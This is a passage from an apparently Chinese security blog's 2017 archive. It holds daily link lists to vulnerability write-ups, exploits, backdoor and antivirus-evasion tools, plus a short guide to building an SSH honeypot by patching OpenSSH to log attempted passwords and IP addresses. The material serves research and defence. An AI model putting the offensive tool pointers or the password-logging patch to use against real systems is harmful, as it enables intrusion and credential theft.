of band）分析系列之DNS渗漏http://www.freebuf.com/vuls/138838.html]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170630安全动态]]></title>
    <url>%2F2017%2F06%2F30%2F20170630%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 hackerone今年有趣的6个漏洞https://flexport.engineering/six-vulnerabilities-from-a-year-of-hackerone-808d8bfa0014 短小精干的Unix类后门Tiny shell的使用与分析 http://www.freebuf.com/sectool/138350.html fg和bg在mac上面的一个坑ctrl+z 是暂停进行中的任务，可以通过jobs查看后台的任务，然后可以选择后台进行(bg)或者前台进行(fg),mac 的oh-my-zsh有问题，bash下面没问题。而在mac上面需要加个百分号%https://stackoverflow.com/questions/32614648/weird-jobs-behavior-within-zshhttp://www.cnblogs.com/lwm-1988/archive/2011/08/20/2147299.html Python Meterpreter OSX Railgunhttps://github.com/rapid7/metasploit-framework/pull/8631 找后台的方法https://www.secpulse.com/archives/59065.html PRMitM：一种可重置账号密码的中间人攻击，双因素认证也无效http://www.freebuf.com/news/138362.html php代码审计学习http://phantom0301.cc/2017/06/06/codeaudit/ 【技术分享】我是如何破解价值8000美金的Uber漏洞http://bobao.360.cn/learning/detail/4042.html Apache ActiveMQ 5.x 上传 Web Shell 的 MSF 漏洞利用脚本https://packetstormsecurity.com/files/143191/apache_activemq_upload_jsp.rb.txt 构造PPSX钓鱼文件https://evi1cg.me/archives/Create_PPSX.html Linux 爆重大安全漏洞，Systemd 和 Service Manager 在处理畸形 DNS 响应数据包时存在缓冲区溢出漏洞，这个漏洞可以直接远程利用实现代码执行（CVE-2017-9445）http://securityaffairs.co/wordpress/60520/hacking/linux-hacking-dns-response.html Google ssl_logger - 可以解密并记录进程的SSL流量 https://github.com/google/ssl_logger json-web-token-attacker - 针对 JavaScript 对象注册与加密的渗透测试助手https://portswigger.net/bappstore/bapps/details/f923cbf91698420890354c1d8958fee6 什么是SSL预证书http://www.freebuf.com/articles/web/138062.html 1科普文 scapy-ssl_tls - 基于 scapy 的 SSL / TLS 层交互式数据包操作工具https://github.com/tintinweb/scapy-ssl_tls owasp-orizon - Owasp Orizon 是一款源代码静态分析工具，用于发现 Java 应用中的安全问题https://github.com/thesp0nge/owasp-orizon WikiLeaks 又公开了两个 CIA 的项目：OutlawCountry 和 Elsa，OutlawCountry 是一个针对 Linux 操作系统的攻击项目，被攻击机器的所有出局流量都会重定向到 CIA 的服务器。ELSA 项目用于攻击 WiFi 环境下的 Windows 笔记本用户，攻击后收集地理位置等各种信息https://wikileaks.org/vault7/#OutlawCountry Cisco IOS 与 IOS XE Software 存在 SNMP 远程代码执行漏洞https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp 开源 DNS 服务 BIND 昨天修复了一个高危远程漏洞（CVE-2017-3143），TSIG 认证处理过程中的错误导致可以接受未授权地动态更新https://deepthought.isc.org/article/AA-01503/ PhantomJS图片渲染XSS漏洞升级为SSRF/Local-File Readhttp://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/ 可以在Linux和macos下结束TCP连接的小工具 https://github.com/google/tcp_killer 【技术分享】使用CTS进行漏洞检测及原理浅析 http://bobao.360.cn/learning/detail/4046.html]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170629安全动态]]></title>
    <url>%2F2017%2F06%2F29%2F20170629%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 mac 软件推荐是否在用ss的全局翻墙的时候，有些应用不能用了，比如网易云音乐，老是切来切去，那么你需要proxifier，帮你实现自动切换。 有关python的面试题目https://github.com/geniustesda/interview_python 利用 SSDP 协议生成 100 Gbps DDoS 流量https://blog.cloudflare.com/ssdp-100gbps/ 浅谈CTF中命令执行与绕过的小技巧http://www.freebuf.com/articles/web/137923.html reverse shell dll 源码https://threathunter.org/topic/594a151bde1d70c20885cca1 黑客渗透攻击之纵向投放和横向移动https://mp.weixin.qq.com/s?__biz=MzI1MDA1MjcxMw==&amp;mid=2649905552&amp;idx=1&amp;sn=c420860b037d2c2688487dc8efffa17c&amp;chksm=f18ed096c6f9598075a2154eabb30c79bc8de813234cb3bf20ad201e8e66333a055b816036db&amp;mpshare=1&amp;scene=23&amp;srcid=06290kRieBGrWIHMMUFgQdBb#rd 黑产大数据：追踪掠食者https://mp.weixin.qq.com/s?__biz=MzI3NDY3NDUxNg==&amp;mid=2247483741&amp;idx=1&amp;sn=df2217710fd4c57f1e7a35bbe3cab700&amp;chksm=eb112766dc66ae709b31b5d0d030222889d125887de05c8aec470c3350ed7e72bff57f450f36&amp;mpshare=1&amp;scene=23&amp;srcid=0629TmMYxfl4OQEv8EfxGuTq#rd 制作WiFi Ducky远程HID检测设备https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247483893&amp;idx=1&amp;sn=41dad53fe09d444812239257d28f2504&amp;chksm=ec6fe6f5db186fe3270b4f0ea2a13401a636b8fbe4085ecad2f751b4c93b980bc60f25c4a053&amp;mpshare=1&amp;scene=23&amp;srcid=0629rAyhVjpFpQJiZvRKQ52u#rd 看我如何偷取别人的云储币（Siacoin）http://www.freebuf.com/articles/database/138188.html 卡巴斯基反病毒文件服务器曝多个漏洞：CSRF到远程代码执行、本地权限提升、反射型XSS、目录遍历https://www.exploit-db.com/exploits/42269 1没有绝对的安全啊，安全厂商也不能保证没问题。 Windows Keylogger Part 2: Defense against user-landhttps://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/ 你知道吗？有些网站在你点击“提交”按钮之前就已经开始收集数据了http://www.freebuf.com/news/138304.html 蓝牙App漏洞系列分析之一CVE-2017-0601： http://paper.seebug.org/339/ 蓝牙App漏洞系列分析之二CVE-2017-0639：http://paper.seebug.org/340/ 蓝牙App漏洞系列分析之三CVE-2017-0645http://paper.seebug.org/341/ 网络攻击后，联邦快递暂停其股票交易https://www.darkreading.com/attacks-breaches/after-cyber-attack-fedex-temporarily-halts-trading-of-its-shares/d/d-id/1329244?_mc=RSS_DR_EDT RunShellcode:小巧的shellcode运行工具https://github.com/zerosum0x0/RunShellcode 【技术分享】CVE-2017-8514简析——SharePoint Follow功能存在XSS漏洞http://bobao.360.cn/learning/detail/4040.html]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170628]]></title>
    <url>%2F2017%2F06%2F28%2F20170628%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态*记一次对钓鱼邮件的实地反击http://www.4hou.com/web/5800.html1这个有点儿6啊，2333 基于 Viper 的二进制软件自动分析框架http://lockboxx.blogspot.com/2017/06/automated-binary-analysis-framework-for.html XSStrike - XSS 漏洞 Fuzz 工具，可绕过 WAF 防御 http://www.kitploit.com/2017/06/xsstrike-fuzz-and-bruteforce-parameters.htm恶意样本分析手册——反调试篇（下）http://blog.nsfocus.net/anti-test-articles2/ 伪装在系统PAM配置文件中的同形异义字后门http://www.freebuf.com/articles/system/138331.html1这个也不错，值得关注研究 Netgear DGN2200 - dnslookup.cgi Command Injection (Metasploit)https://www.exploit-db.com/exploits/42257/ Easy File Sharing Web Server 7.2 - GET HTTP Request (PassWD) Buffer Overflow (SEH) https://www.exploit-db.com/exploits/42261/ FFmpeg安全问题讨论http://blogs.360.cn/blog/ffmpegs_security_discussion/ Chromium 新的弹窗机制以及 HTML 的 元素https://segmentfault.com/a/1190000009954183如何判断目标站点是否为 Django 开发http://paper.seebug.org/336/ 机器学习自主解决安全威胁离我们还有多远？http://www.freebuf.com/company-information/138541.html【技术分享】如何利用机器学习检测加密恶意流量http://bobao.360.cn/learning/detail/4035.html 有关petya勒索病毒分析https://www.binarydefense.com/petya-ransomware-without-fluff/#.WVM3KSDJYNY.twitter*发现系统中的Shadow Admins账户https://www.cyberark.com/threat-research-blog/shadow-admins-stealthy-accounts-fear/]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170627安全动态]]></title>
    <url>%2F2017%2F06%2F27%2F20170627%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造https://mp.weixin.qq.com/s?__biz=MzAwNTI1NDI3MQ==&amp;mid=2649612528&amp;idx=1&amp;sn=1f4550c9c7226a514e2e568fdbf590b0&amp;chksm=83063de0b471b4f65a0361aaf35e2978456689a009f32e92de54b6728ded7161dc67b7d55584&amp;mpshare=1&amp;scene=23&amp;srcid=0626gn319cHUnTLlydyaAefi#rd 将 Metasploit Payloads 注入到 Android 应用的手法介绍https://pentestlab.blog/2017/06/26/injecting-metasploit-payloads-into-android-applications-manually/ 内存取证分析示例https://articles.forensicfocus.com/2017/06/26/ram-forensic-analysis/ 如何在 macOS 上安装 Powershell 6.0http://www.techrepublic.com/article/how-to-install-microsoft-powershell-6-0-on-macos/ 1这个不错啊，可以试试 jsonp注入实例https://www.exploit-db.com/docs/42250.pdf Responder 工具与 LLMNR/NBT-NS 协议https://securitycafe.ro/2017/06/26/going-further-with-responders-basic-authentication/ 红队攻击手法的要点备忘录https://github.com/vysec/RedTips 渗透测试基础架构系列 part4： 后渗透攻击http://bitvijays.github.io/LFF-IPS-P4-PostExploitation.html 渗透测试工程师常用的 Python 库和程序列表 https://vulnerablelife.wordpress.com/2017/05/13/python-for-penetration-testers/ 1看完你还觉得你python很熟练吗 无文件应用白名单绕过及 Powershell 混淆http://blog.4n6ir.com/2017/06/fileless-application-whitelist-bypass.htmlhttp://t.cn/Rop5SbW Illuminate Js - JS 在线反混淆网站https://www.illuminatejs.com/ NTFS 文件格式的取证、恶意滥用与漏洞分析https://drive.google.com/file/d/0B3P18M-shbwrM1E2V24tTVFUU3M/view GraphQL NoSQL Injection Through JSON Types &#104;&#x74;&#x74;&#112;&#115;&#x3a;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#117;&#109;&#46;&#99;&#x6f;&#x6d;&#x2f;&#x40;&#x65;&#97;&#115;&#x74;&#x35;&#116;&#x68;&#x2f;&#x67;&#x72;&#97;&#112;&#x68;&#x71;&#108;&#45;&#x6e;&#x6f;&#115;&#113;&#108;&#45;&#105;&#x6e;&#x6a;&#101;&#99;&#116;&#x69;&#x6f;&#110;&#x2d;&#116;&#104;&#x72;&#x6f;&#x75;&#103;&#104;&#x2d;&#x6a;&#115;&#111;&#110;&#45;&#116;&#121;&#x70;&#101;&#115;&#45;&#97;&#49;&#97;&#48;&#97;&#x33;&#x31;&#x30;&#x63;&#x37;&#53;&#x39; ffmpeg的一个信息泄漏漏洞、项目、实例和paper https://hackerone.com/reports/243470 https://github.com/neex/ffmpeg-avi-m3u-xbin/ https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit 基于Graylog日志安全审计实践http://bobao.360.cn/learning/detail/4025.html Python安全 - 从SSRF到命令执行惨案https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html Oauth协议介绍与安全隐患https://mp.weixin.qq.com/s/bK6RSpX65XlHmbMG1N0myg OpenVPN fuzzers发布（前段时间作者发了一份关于多个openvpn的漏洞，就是用的这个）https://github.com/guidovranken/openvpn/tree/fuzzing 通过非数字和字符的方式Bypass WAF(PHP)https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/ 简单$ _COOKIE后门 1还第一次听说cookie后门 Metasploit RSS feed插件（获取shell时获取推送通知）https://github.com/rapid7/metasploit-framework/pull/8612 CrackMapExec：渗透后期利用工具https://github.com/byt3bl33d3r/CrackMapExec 通过Sysinternals Sysmon和 Powershell logs检测攻击行为https://securitylogsdotorg.files.wordpress.com/2017/06/bsides-athens-sysmon-final.pdf 利用单片机快速实现家庭智能控制平台http://www.freebuf.com/news/138438.html 修改了一个爬虫htcaphttp://0cx.cc/Modify_the_htcap_to_mysql.jspx 如何检测钓鱼攻击https://blog.malwarebytes.com/101/2017/06/somethings-phishy-how-to-detect-phishing-attempts/ 提高驾驶技术：用GAN去除(爱情)动作片中的马赛克和衣服https://zhuanlan.zhihu.com/p/27199954*【技术分享】全面复现Esteemaudit利用过程(含域环境搭建过程)http://bobao.360.cn/learning/detail/4021.html Python + js 通过RSA算法对post表单数据进行加密处理http://blog.nsfocus.net/python-js-encrypts-post-form-data-rsa-algorithm/ NTI任务管理之django+python篇celery异步任务使用-1http://blog.nsfocus.net/nti-task-management-djangopython-chapter-celery-asynchronous-task-1/ Mirai代码及原理分析http://blog.nsfocus.net/mirai-code-principle-analysis/1绿盟出品的几篇干货文章 今天的文章貌似有点儿多。。。]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170626安全动态]]></title>
    <url>%2F2017%2F06%2F26%2F20170626%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 使用 Sysmon 与 Powershell Logs 检测攻击行为 https://securitylogsdotorg.files.wordpress.com/2017/06/bsides-athens-sysmon-final.pdf T00LS帖子正文XSShttps://mp.weixin.qq.com/s/HCKs6Bhc30dlMMmcIH401Q BurpSuite 几个扩展的使用https://zhuanlan.zhihu.com/p/27545785?group_id=862240683996622848 看我如何利用开发人员所犯的小错误来盗取各种tokens http://www.freebuf.com/articles/web/137793.html PhpStorm Xdebug远程调试环境搭建原理分析及问题排查 http://xxlegend.com/2017/05/23/PhpStorm%20Xdebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/ 利用BeEF REST API自动化控制僵尸主机http://www.freebuf.com/articles/network/137662.html [代码审计]菜鸟学代码审计-PIMS三个漏洞+里程密最新版V2.3 SQL注入漏洞https://xianzhi.aliyun.com/forum/read/1761.html ssrf、ssrf内网地址fuzz、dns二次rebinding、支持ipv4/ipv6、支持ip地址转码、dns记录污染https://github.com/Tr3jer/dnsAutoRebinding DNS typosquatting 实现水坑攻击https://blog.0day.rocks/practical-waterholing-through-dns-typosquatting-e252e6a2f99e Viproy - VoIP 渗透测试与漏洞利用工具集 https://twitter.com/KitPloit/status/878632599639412736/photo/1 NTFS 相关的取证分析、恶意软件与漏洞介绍https://drive.google.com/file/d/0B3P18M-shbwrM1E2V24tTVFUU3M/view XSS’OR 开源，Hack with JavaScripthttps://mp.weixin.qq.com/s/BUNFEbEbDjbBwRvEloomOg 利用 Huginn 将微信公众号转化为 RSS 订阅 https://www.40huo.cn/blog/wechat2rss-by-huginn.html Python Waf黑名单过滤下的一些Bypass思路http://www.0aa.me/index.php/archives/123/ 电子数据取证技能树 (V1)https://mp.weixin.qq.com/s?__biz=MzUyNTA2MTQ5Mw==&amp;mid=2247483707&amp;idx=1&amp;sn=584d666fb85762354378d0919dad5ed5&amp;scene=0 Tomcat 源代码调试笔记 - 看不见的 Shell https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&amp;mid=2247483666&amp;idx=1&amp;sn=6421b39037735953fa3148bdbf5bf912&amp;chksm=ecb11de2dbc694f4e00a55667fdc81387d53494788f43ec90327fa64f8c02fa6805fc0577671&amp;mpshare=1&amp;scene=1&amp;srcid=0623Z7avuWtePZvyDd2GWbOi&amp;key=f0ee669 通过NSynth生成你自己的声音https://magenta.tensorflow.org/nsynth-fastgen apparatus：IOT安全分析框架http://seclist.us/apparatus-is-a-security-framework-to-facilitate-security-analysis-in-iot-systems.html pwn Vivotek 的网络摄像头https://blog.cal1.cn/post/An%20easy%20way%20to%20pwn%20most%20of%20the%20vivotek%20network%20cameras]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[weblogic反序列化漏洞]]></title>
    <url>%2F2017%2F06%2F25%2Fweblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[####先挖个坑]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ssh蜜罐搭建]]></title>
    <url>%2F2017%2F06%2F25%2Fssh%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[0x01 前言&nbsp;&nbsp;&nbsp;&nbsp;本来觉得应该不是一件很复杂的事，结果搞了三个小时才搞定(可能是我太菜吧)，里面有几个坑，记录一下。一直以来想去做蜜罐这么个东西，ssh is only the begining!ssh secure shell，就是安全的shell，至于为什么安全呢？怎么就安全了呢？ 较rlogin、rsh等这些不加密的协议，ssh传输是加密的，历史上ssh协议的实现有openssh和ossh，前者是主流，后面非特殊情况涉及到的ssh实现均指的是openssh。 ssh协议有两个版本SSH-1 and SSH-2。ssh提供了两种方式的认证，一种是密码登录方式的认证，另外一种是基于秘钥的认证。第一种就是提供的默认加密算法是椭圆曲线加密算法ecdsa-sha2-nistp256，第二种是将rsa的公钥写到服务器的authorized_keys中实现免密码登录。0x02 具体安装步骤1本次测试是在ubuntu14.04X64环境下测试 1.首先git clone这两个资源https://github.com/openssh/openssh-portablehttps://github.com/w8rbt/sshlog2.’打补丁’。12$ patch --dry-run &lt; sshlog.patch$ patch &lt; sshlog.patch 运行上面两条命令，其实就是在auth-passwd.c中加上几行代码 12345678910111213struct ssh *ssh = active_state; if(authctxt-&gt;user &amp;&amp; password &amp;&amp; ssh) &#123; logit(&quot;sshlog: %.100s %s %.200s %lu&quot;, authctxt-&gt;user, password, ssh_remote_ipaddr(ssh), (unsigned long)time(NULL));&#125; else &#123; logit(&quot;sshlog: unable to log attempt&quot;);&#125; 3.安装前检查发现源码中没有configure文件，原来是需要自己运行autoreconf这个来生成configure文件,参考官方说明：http://www.openssh.com/portable.html4.编译编译的时候需要安装依赖 12$ sudo apt-get install libz-dev$ sudo apt-get install libssl-dev 5.链接和安装这个时候又会报一个错Privilege separation user sshd does not exist这个时候需要在/etc/passwd文件中加入 ： 1sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 6.Done! 0x03 待续1图形化界面实时展示ssh被爆破记录 0x04 reference1.https://www.wikiwand.com/en/Secure_Shell2.https://www.wikiwand.com/en/Elliptic_curve_cryptography3.https://my.oschina.net/realfighter/blog/3884864.https://m14.cc/magic-behind-compiling-software/]]></content>
      <categories>
        <category>日常分享</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170623安全动态]]></title>
    <url>%2F2017%2F06%2F23%2F20170623%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 发现一个不错的社区 v2ex V2EX 是创意工作者们的社区。这里目前汇聚了超过 110,000 名主要来自互联网行业、游戏行业和媒体行业的创意工作者https://www.v2ex.com/ 内网渗透之PC控制及完美过杀毒!!!https://mp.weixin.qq.com/s?__biz=MjM5MDkwNjA2Nw==&amp;mid=2650374095&amp;idx=1&amp;sn=5d0fdb1efdba018f36a55aaa40c9aa7a&amp;chksm=beb07c7389c7f5650d3f1d26e0d5d5f230a5e569498f23dbb4cac925c34a133bf256a826f0b1&amp;mpshare=1&amp;scene=23&amp;srcid=0624DcbNkIfgyn9BrpMG68gC#rd Firefox 56 现已开始支持 headless 模式 https://bugzilla.mozilla.org/show_bug.cgi?id=1355150 收集 npm 弱凭据的三种方法https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md bt2 - 使用 Python 编写的一款利用 Telegram 通信平台作为 C&amp;C 服务的后门工具https://github.com/blazeinfosec/bt2 1思路够猥琐 yarGen - YARA 规则生成器https://github.com/Neo23x0/yarGen 使用 Burp Infiltrator 进行漏洞挖掘http://blog.portswigger.net/2017/06/behind-enemy-lines-bug-hunting-with.html sharkPy - 使用 Wireshark 和 libpcap 来解析、分析与交互操作网络数据包的的 Python 工具http://www.kitploit.com/2017/06/sharkpy-nsa-tool-to-dissect-analyze-and.html Web 中的跨域 Json 劫持http://blog.portswigger.net/2016/11/json-hijacking-for-modern-web.html 通过盗窃OAuth令牌绕过Airbnb认证https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/ hooking新技术:GhostHook-可以绕过安全内核和基于钩子的处理器追踪https://www.cyberark.com/threat-research-blog/ghosthook-bypassing-patchguard-processor-trace-based-hooking/ 另类的Javascript伪协议http://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/ MVVM 框架安全https://speakerdeck.com/oritz/mvvm-framework-security TheFatRat – Massive Exploitation Tool https://www.darknet.org.uk/2017/06/thefatrat-massive-exploitation-tool/ Fuzzing Apache httpd server with American Fuzzy Lop + persistent modehttps://sensepost.com/blog/2017/fuzzing-apache-httpd-server-with-american-fuzzy-lop-%2B-persistent-mode/ ShellStack - A PHP Based Tool That Helps You To Manage All Your Backdoored Websites Efficientlyhttp://www.kitploit.com/2017/06/shellstack-php-based-tool-that-helps.html IDA series, part 2: debugging a .NET executablehttps://qmemcpy.github.io/post/ida-series-2-debugging-net How I Built An XSS Worm On Atmailhttps://www.bishopfox.com/blog/2017/06/how-i-built-an-xss-worm-on-atmail/ Microsoft says ‘no known ransomware’ runs on Windows 10 S – so we tried to hack it http://www.zdnet.com/article/microsoft-no-known-ransomware-windows-we-tried-to-hack-it/#ftag=RSSbaffb68 IFi - the interactive firewallhttps://howucan.gr/scripts-tools/2396-ifi-the-interactive-firewall 1mark Practical waterholing through DNS typosquattinghttps://blog.0day.rocks/practical-waterholing-through-dns-typosquatting-e252e6a2f99e 1学习思路 移动安全|APP签名伪造任意账号密码修改https://mp.weixin.qq.com/s?__biz=MzA3ODI1MjA1NA==&amp;mid=2655064009&amp;idx=1&amp;sn=b13c0328f3b14cc99b826f61f97a3ab7&amp;chksm=84f03eb0b387b7a6b1b031419321cfe5adeff3beea7c550b8b1b71eba325bee5f069b88897aa&amp;mpshare=1&amp;scene=23&amp;srcid=0624I40MWk0HEKQ3lBjgrmgY#rd]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170622安全动态]]></title>
    <url>%2F2017%2F06%2F22%2F20170622%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Serpico - 渗透测试报告生成与协作工具https://github.com/SerpicoProject/Serpico 攻击容器集群管理平台https://0x0d.im/archives/attack-container-management-platform.html 构造PPSX钓鱼文件https://evi1cg.me/archives/Create_PPSX.html 没有钱的安全部之资产安全http://www.jianshu.com/p/572431447613 1甲方的小伙伴看过来 真实案例｜RDP协议暴力破解卷土重来！http://www.aqniu.com/threat-alert/17391.html 一次测试引发的探索：关于分号在java web中的一个特性 http://www.freebuf.com/articles/web/137829.html 连载黑客小说|《杀手》第五章：恶作剧http://www.freebuf.com/news/138061.html27部优秀的黑客纪录片 http://www.freebuf.com/articles/others-articles/137664.html 1看小说了黑客们,看电影了黑客们 手把手简易实现shellcode及详解http://blog.nsfocus.net/simple-realization-hand-handle-shellcode-detailed-explanation/ 技术分享】手把手教你使用PowerShell实现一句话Web客户端http://bobao.360.cn/learning/detail/4006.html 技术分享】Windows环境渗透技巧之PowerShell Payload的远程执行http://bobao.360.cn/learning/detail/4004.html Wannacry深度解析：第一阶段taskschehttp://www.freebuf.com/vuls/135822.html 研究员通过 Fuzz 的方法发现了 OpenVPN 项目的多个远程漏洞https://guidovranken.wordpress.com/2017/06/21/the-openvpn-post-audit-bug-bonanza/ uwsgi-listen-queue-full解决方案http://blog.nsfocus.net/uwsgi-listen-queue-full/ 使用 Python 检测与绕过 Web 应用防火墙的教程 http://www.kalitutorials.net/2016/12/python-detect-and-bypass-web-application-firewall.html joy：用于捕获和分析网络数据包的软件，可被用于网络研究，取证和安全监控。https://github.com/cisco/joy 通过Metasploit验证SNMP和NTP放大攻击http://carnal0wnage.attackresearch.com/2017/06/ntpsnmp-amplification-attacks.html 根据从恶意软件中发现的字符串自动化生成YARA规则 https://github.com/Neo23x0/yarGen java反序列化漏洞分析https://xianzhi.aliyun.com/forum/read/1757.html 【技术分享】TP-Link WR841N路由器任意代码执行漏洞分析（附演示视频）http://bobao.360.cn/learning/detail/4008.html 我是如何拿下破冰项目的https://xianzhi.aliyun.com/forum/read/1769.html badusb的一个资源https://pan.baidu.com/share/link?shareid=215811729&amp;uk=3535191920#list/path=%2FF11%2Fbadusb&amp;parentPath=%2FF11]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170621安全动态]]></title>
    <url>%2F2017%2F06%2F21%2F20170621%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 利用 Scapy 和 radamsa Fuzz 私有协议https://blog.blazeinfosec.com/fuzzing-proprietary-protocols-with-scapy-radamsa-and-a-handful-of-pcaps/ 1协议分析以及协议安全一直是自己想要学的技能，挖个坑，以后一定要填上 在 Metasploit 中实现杀软免杀的方法http://schierlm.users.sourceforge.net/avevasion.html NXcrypt - 一款 Python 后门框架http://www.kitploit.com/2017/06/nxcrypt-python-backdoor-framework.html 1玩python的小伙伴可以关注下 catphish - 用于网络钓鱼和企业间谍活动中的相似域名生成工具https://github.com/ring0lab/catphish SMB 2 和 SMB 3 协议中内置的签名和加密特性剖析 https://blogs.msdn.microsoft.com/openspecification/2017/05/26/smb-2-and-smb-3-security-in-windows-10-the-anatomy-of-signing-and-cryptographic-keys/ 【技术分享】基于TCP/IP协议栈的隐写术和隐蔽通道（part 1）http://bobao.360.cn/learning/detail/3754.html 【技术分享】针对AIX系统的渗透测试技巧分享http://bobao.360.cn/learning/detail/3750.html Pcap_tools: 基于网络流量包的漏洞自动化分析 https://github.com/pythonran/Pcap_tools 浅谈XXE漏洞攻击与防御http://thief.one/2017/06/20/1/ 绕过杀软的实用技巧http://www.irongeek.com/i.php?page=videos/anycon2017/103-noob-101-practical-techniques-for-av-bypass-jared-hoffman 基于USB armory 制作一个USB恶意软件分析器 http://www.4hou.com/technology/5525.html 关于Active Directory域的一些属性和指令http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/ facebook的广告服务的一个广告主信息泄漏漏洞（$10000）http://philippeharewood.com/de-anonymizing-facebook-ads/]]></content>
      <categories>
        <category>每日安全动态</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[20170620安全动态]]></title>
    <url>%2F2017%2F06%2F20%2F20170620%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 一个国外的mac小工具安装的网站，比如说mac上没有的一些linux系统命令比如 pstree、binwalk等，都可以从这里找到下载和安装的方法，推荐http://macappstore.org/ Waidps: 一款新的WiFi无线审计套装，界面好看，傻瓜化操作，在YouTube 上有各种功能的演示视频https://github.com/SYWorks/waidps 如何构建一个分布式爬虫：基础篇http://python.jobbole.com/87826/ 甲方安全建设步骤http://pirogue.org/2017/06/17/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4/ 1甲方的小伙伴可以关注一下 《浏览器地址栏之困》，深刻理解地址栏之困，即是挖掘URL Spoof漏洞的核心奥义。PPT下载https://github.com/xisigr/paper/blob/master/NSC2017%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E4%B9%8B%E5%9B%B0.pdf linux 提权工具https://github.com/mzet-/linux-exploit-suggester https://github.com/PenturaLabs/Linux_Exploit_Suggester https://github.com/jondonas/linux-exploit-suggester-2 What is command injection and how does it work?https://www.quora.com/What-is-command-injection-and-how-does-it-work A VirusTotal-powered Python daemon that watches files in a directory for malware. https://github.com/supriyo-biswas/vtlivescan 12不得不说这是个好东西，自己下载的东西可以在不安装杀毒软件的情况下检测是否有毒mac 下面没有notify-send怎么办？mac下面有 terminal-notifier（亲测效果不错） http://osxdaily.com/2012/08/03/send-an-alert-to-notification-center-from-the-command-line-in-os-x/ nmap扫描的图形化展示 php开发https://github.com/RASSec/NMAP_INTERFACE 手工检测Web应用指纹的一些技巧http://www.freebuf.com/news/137497.html 盘点21世纪以来最臭名昭著的15起数据安全事件 http://www.freebuf.com/news/137467.html 【技术分享】斯巴鲁汽车软件漏洞分析—永不失效的令牌 http://bobao.360.cn/learning/detail/3997.html windows日志分析工具https://github.com/sans-blue-team/DeepBlueCLI 1部门小伙伴运营的社区，干货很多，推荐关注 https://threathunter.org/topic/5947750c2cc7eb8464e32bd3 一个能够Bypass大部分杀软的工具：avoidz-master https://threathunter.org/topic/59479cc1d612199a74ba80a7 NSA 也在 GitHub 上注册了账号，而且一次开源了多个项目https://nationalsecurityagency.github.io/ BASS - Talos 开源的、用于从恶意软件样本中自动提取模式特征的工具https://github.com/Cisco-Talos/BASS pyrasite - 向正在运行中的 Python 进程注入代码 https://www.darknet.org.uk/2017/06/pyrasite-inject-code-into-running-python-processes/ CloudFail - 利用 DNS 的配置错误以及旧数据记录，定位 CloudFlare CDN 背后的真实 IPhttps://github.com/m0rtem/CloudFail Google CTF The X Sanitizer Web 挑战题的 